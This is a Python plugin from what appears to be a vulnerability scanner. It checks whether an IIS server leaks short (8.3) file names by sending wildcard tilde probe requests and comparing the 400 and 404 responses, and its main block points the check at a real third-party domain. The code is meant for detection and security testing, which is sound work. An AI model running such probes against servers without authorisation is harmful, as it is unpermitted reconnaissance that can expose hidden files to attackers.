#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class Iis_Shortfilename_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'IIS短文件名漏洞',
            'description': 'IIS短文件名漏洞,影响范围为: IIS 1.0，Windows NT 3.51, IIS 3.0，Windows NT 4.0 Service Pack 2, IIS 4.0，Windows NT 4.0选项包, IIS 5.0，Windows 2000, IIS 5.1，Windows XP Professional和Windows XP Media Center Edition, IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition, IIS 7.0，Windows Server 2008和Windows Vista, IIS 7.5，Windows 7（远程启用<customErrors>或没有web.config）, IIS 7.5，Windows 2008（经典管道模式）注意：IIS使用.Net Framework 4时不受影响',
            'date': '2012-06-29',
            'exptype': 'check',
            'type': 'Info'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        url1_400 = self.url + "/san1e*~1****/a.aspx"
        url1_404 = self.url + "/*~1****/a.aspx"
        try:
            req_400 = await request.get(url1_400, headers = self.headers)
            req_404 = await request.get(url1_404, headers = self.headers)
            if req_400.status == 400 and req_404.status == 404:
                return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    IIS_Shortfilename = Iis_Shortfilename_BaseVerify('https://baidu.com')
    IIS_Shortfilename.check()